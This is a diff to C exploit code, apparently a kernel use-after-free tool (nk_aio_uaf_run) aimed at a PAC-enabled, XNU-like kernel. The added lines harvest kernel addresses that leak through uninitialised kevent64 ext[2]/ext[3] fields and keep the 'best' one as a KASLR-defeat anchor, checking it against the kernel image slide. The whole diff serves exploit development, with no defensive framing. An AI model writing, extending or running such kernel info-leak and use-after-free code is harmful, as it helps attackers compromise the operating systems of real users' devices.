@@ -125,6 +125,12 @@ static void reap_cb2(void)
 /* A PAC-signed kernel pointer keeps the address in the low 56 bits and
  * puts the authentication code in the top bits, so the raw value would
  * fail a (v >> 48) == 0xFFFF test. Mask the PAC off first. */
+/* The most kernel-looking value seen in any kevent field, kept for the
+ * final summary: this is the KASLR anchor we are after. */
+static uint64_t g_aio_best_kva;
+static char     g_aio_best_field[16];
+static uint32_t g_aio_kva_hits;
+
 static int is_kernel_va(uint64_t v)
 {
     uint64_t a = v & 0x00ffffffffffffffULL;
@@ -147,6 +153,14 @@ static void report_kev(const struct kevent64_s *kev, int attempt)
             (unsigned long long)kev->udata,
             (unsigned long long)kev->ext[0],
             (unsigned long long)kev->ext[1]);
+    /* ext[2]/ext[3] are NOT written by filt_aioprocess - they keep
+     * whatever was in the kernel's kevent buffer, i.e. leftovers from the
+     * kernel stack. That is where a stray kernel address shows up, so they
+     * are printed raw every time, not only when they look like a VA. */
+    aio_logx("B2", "att=%d ext2=0x%016llx ext3=0x%016llx  (kernel leftovers - the leak candidate)",
+            attempt,
+            (unsigned long long)kev->ext[2],
+            (unsigned long long)kev->ext[3]);
 
     uint64_t fields[8];
     fields[0] = (uint64_t)kev->ident;
@@ -161,6 +175,11 @@ static void report_kev(const struct kevent64_s *kev, int attempt)
 
     for (int i = 0; i < 8; i++) {
         if (!is_kernel_va(fields[i])) continue;
+        g_aio_kva_hits++;
+        if (!g_aio_best_kva || (fields[i] & 0x00ffffffffffffffULL) > (g_aio_best_kva & 0x00ffffffffffffffULL)) {
+            g_aio_best_kva = fields[i];
+            snprintf(g_aio_best_field, sizeof(g_aio_best_field), "%s", names[i]);
+        }
         if (g_nk.slide != 0 && g_nk.base != 0) {
             if (fields[i] >= g_nk.base && fields[i] < g_nk.base + NK_KIMG_SPAN) {
                 aio_logx("B2", "att=%d %s=0x%016llx — kernel VA, в диапазоне образа (slide 0x%llx подтверждён)",
@@ -357,6 +376,10 @@ int nk_aio_uaf_run(int attempts)
            (unsigned long long)st.last_ext0, (unsigned long long)st.last_ext1,
            (unsigned long long)st.last_ident, (unsigned long long)st.last_udata,
            (unsigned long long)st.last_fflags);
+    nk_doc_log(AIO_LOG_FILE, "[AIO-B12] KVA hits=%d best_field=%s best=0x%016llx",
+               g_aio_kva_hits, g_aio_best_field, (unsigned long long)g_aio_best_kva);
+    nk_log("[AIO-B12] KVA hits=%d best_field=%s best=0x%016llx",
+           g_aio_kva_hits, g_aio_best_field, (unsigned long long)g_aio_best_kva);
     nk_doc_log(AIO_LOG_FILE, "[AIO-B12] RESULT hits=%d silent=%d attempts=%d "
                "ext0=0x%016llx ext1=0x%016llx ident=0x%016llx udata=0x%016llx fflags=0x%016llx",
                st.hits, st.silent, st.attempts,
